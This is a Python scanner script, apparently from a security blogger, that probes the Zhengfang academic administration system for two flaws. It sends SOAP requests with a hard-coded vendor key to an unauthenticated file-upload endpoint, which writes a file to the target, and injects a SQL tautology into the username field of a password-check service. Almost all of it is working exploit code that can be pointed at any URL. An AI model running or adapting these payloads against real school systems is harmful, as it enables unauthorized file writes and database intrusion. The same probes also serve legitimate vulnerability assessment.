#!/usr/bin/env python
# author: 白袍@Adan0s
# blog: https://eviladan0s.github.io
import requests, sys

def uploadFileVul(url):
    #上传文件接口
    headers = {'Content-Type':'text/xml; charset=utf-8', 'Content-Length':'468', 'SOAPAction':'"http://tempuri.org/zjdx/file/UploadFile2"'}
    data = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFile2 xmlns="http://tempuri.org/zjdx/file">
      <fs>aGFja2J5YWRhbjBz</fs>
      <FileName>adan0s.txt</FileName>
      <strpath>/</strpath>
      <strKey>KKKGZ2312</strKey>
    </UploadFile2>
  </soap:Body>
</soap:Envelope>
    """
    r = requests.post(url + "/file.asmx",headers = headers, data = data)
    if r.status_code == 200 and "Result>true</UploadFile" in r.text:
        return True
    else:
        return False

def sqlInjectBMCheckPasswordResult(url):
    #注入接口
    headers = {'Content-Type':'text/xml; charset=utf-8', 'Content-Length':'468', 'SOAPAction':'"http://www.zf_webservice.com/BMCheckPassword"'}
    data = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:tns="http://tempuri.org/"
    xmlns:types="http://tempuri.org/encodedTypes"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:BMCheckPassword xmlns:q1="http://zf_webservice.com/BMCheckPassword">
    <strYHM xsi:type="xsd:string">jwc01' and 'a'='a<strYHM>
    <strPassword xsi:type="xsd:string">string</strPassword>
    <xh xsi:type="xsd:string">string?</xh>
    <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:BMCheckPassword>
    </soap:Body>
    </soap:Envelope>
    """
    r = requests.post(url + "/service.asmx",headers = headers, data = data)
    if r.status_code == 200 and 'xsi:type="xsd:int">5</BMCheckPasswordResult>' in r.text:
        return True
    else:
        return False

def run():
    print("""
        正方教务系统漏洞检测
        python3 {} http://test.com 
        """.format(sys.argv[0]))
    try:
        try:
            r = requests.get(sys.argv[1])
            if r.status_code == 200:
                print("[*] Loading...")
            else:
                print("[!] ERROR!")
                return 0
        except requests.exceptions.ConnectionError:
            print("[!] ERROR!")
            return 0

        if uploadFileVul(sys.argv[1]) == True:
            print("\033[0;31m%s\033[0m" % ("[!]  存在文件上传漏洞"))
        else:
            print("\033[0;32m%s\033[0m" % ("[*] 无文件上传漏洞"))
        if sqlInjectBMCheckPasswordResult(sys.argv[1]) == True:
            print("\033[0;31m%s\033[0m" % ("[!]  存在SQL注入漏洞"))
        else:
            print("\033[0;32m%s\033[0m" % ("[*] 无SQL注入漏洞"))
    except IndexError:
        print("[!] Lose the target!")
        return 0

if __name__ == "__main__":
    run()
    


